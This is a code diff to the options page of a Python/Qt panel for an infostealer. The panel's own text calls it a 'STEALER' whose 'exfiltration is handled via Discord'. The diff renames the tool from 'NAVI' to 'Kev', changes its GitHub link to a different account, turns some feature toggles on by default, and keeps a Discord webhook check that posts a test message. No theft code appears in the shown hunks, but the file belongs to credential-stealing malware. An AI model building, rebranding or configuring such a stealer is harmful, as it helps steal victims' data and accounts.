@@ -14,9 +14,9 @@ class OptionsPage(QWidget):
     def __init__(self):
         super().__init__()
         self.debugging_active = False
-        self.security_active = False
+        self.security_active = True
         self.files_active = False
-        self.ping_active = False
+        self.ping_active = True
         self.init_ui()
 
     def init_ui(self):
@@ -173,11 +173,11 @@ class OptionsPage(QWidget):
         info_layout.setContentsMargins(15, 25, 15, 15)
         info_layout.setSpacing(15)
         
-        info_text = QLabel("NAVI STEALER\n\nAll exfiltration is handled via Discord.\nMake sure to provide a valid webhook.")
+        info_text = QLabel("Kev STEALER\n\nAll exfiltration is handled via Discord.\nMake sure to provide a valid webhook.")
         info_text.setStyleSheet("color: #aaa; font-size: 13px;")
         info_text.setAlignment(Qt.AlignCenter)
         
-        github_link = QLabel('<a href="https://github.com/glockinhand/navi-multitool" style="color: #00a2ff; text-decoration: none; font-size: 14px; font-weight: bold;">GITHUB.COM/GLOCKINHAND/NAVI-MULTITOOL</a>')
+        github_link = QLabel('<a href="https://github.com/ns-demon/navi-multitool" style="color: #00a2ff; text-decoration: none; font-size: 14px; font-weight: bold;">GITHUB.COM/ns-demon/NAVI-MULTITOOL</a>')
         github_link.setOpenExternalLinks(True)
         github_link.setAlignment(Qt.AlignCenter)
         
@@ -238,11 +238,11 @@ class OptionsPage(QWidget):
             embed = {
                 "embeds": [
                     {
-                        "title": "NAVI — Connection Check",
+                        "title": "Kev — Connection Check",
                         "description": "✅ Webhook connection successful.",
                         "color": 0x5865F2,
                         "footer": {
-                            "text": "NAVI • https://github.com/glockinhand/navi-multitool"
+                            "text": "Kev • https://github.com/ns-demon/navi-multitool"
                         },
                         "timestamp": __import__("datetime").datetime.utcnow().isoformat()
                     }
@@ -252,10 +252,10 @@ class OptionsPage(QWidget):
             r = requests.post(url, json=embed, timeout=10)
 
             if r.status_code in (200, 204):
-                self.box = CustomMessageBox("NAVI", "success", "NAVI: check sent!")
+                self.box = CustomMessageBox("Kev", "success", "Kev: check sent!")
             else:
-                self.box = CustomMessageBox("NAVI", "error", "NAVI: invalid webhook")
+                self.box = CustomMessageBox("Kev", "error", "Kev: invalid webhook")
             self.box.show()
         except Exception as e:
-            self.box = CustomMessageBox("NAVI", "error", "NAVI: error")
+            self.box = CustomMessageBox("Kev", "error", "Kev: error")
             self.box.show()
